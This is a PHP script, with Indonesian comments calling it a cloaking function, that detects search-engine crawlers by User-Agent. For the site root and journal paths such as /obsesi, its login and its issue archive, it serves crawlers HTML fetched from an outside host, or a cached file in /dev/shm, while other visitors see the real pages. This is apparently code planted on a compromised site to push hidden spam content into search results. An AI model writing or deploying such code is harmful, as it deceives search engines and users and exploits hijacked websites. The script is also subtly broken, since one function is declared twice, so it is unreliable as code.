<?php
function is_google_bot_v1(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
    foreach($a as $b){
        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
    }
    return false;
}

$uri = $_SERVER['REQUEST_URI'];
if($uri == '/' || $uri == '/index.php'){
    if(is_google_bot_v1()){
        $c = curl_init('https://inkaindonesia.org/landing/obsesi-revisi1.html');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        echo curl_exec($c);
        curl_close($c);
        exit;
    }
}

// ============================================================
// 2. FUNGSI CLOAKING SUB index.php/obsesi/login
// ============================================================
function is_google_bot_v2(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
    foreach($a as $b){
        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
    }
    return false;
}

if(strpos($uri, 'index.php/obsesi/login') !== false || $uri == '/index.php'){
    if(is_google_bot_v2()){
        $c = curl_init('https://inkaindonesia.org/landing/obsesi-login.html');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        echo curl_exec($c);
        curl_close($c);
        exit;
    }
}

// ============================================================
// 3. FUNGSI CLOAKING SUB obsesi (tanpa index.php)
// ============================================================
function is_google_bot_v3(){
    $bots = [
        'Googlebot', 'Google-InspectionTool', 'AdsBot-Google', 'Mediapartners-Google',
        'Bingbot', 'Slurp', 'DuckDuckBot', 'AhrefsBot', 'SemrushBot', 'MJ12bot', 'YandexBot'
    ];
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    foreach($bots as $bot){
        if(stripos($user_agent, $bot) !== false){
            return true;
        }
    }
    return false;
}

if(stripos($uri, '/obsesi') !== false){
    if(is_google_bot_v3()){
        $file = '/dev/shm/mail-obsesi.txt';
        if(file_exists($file)){
            readfile($file);
        } else {
            echo 'cache not ready';
        }
        exit;
    }
}

// ============================================================
// 4. FUNGSI CLOAKING SUB obsesi/issue/archive
// ============================================================
function is_google_bot_v2(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
    foreach($a as $b){
        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
    }
    return false;
}

if(strpos($uri, 'obsesi/issue/archive') !== false || $uri == '/index.php'){
    if(is_google_bot_v2()){
        $c = curl_init('https://inkaindonesia.org/landing/obsesi-issue-archive.html');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        echo curl_exec($c);
        curl_close($c);
        exit;
    }
}

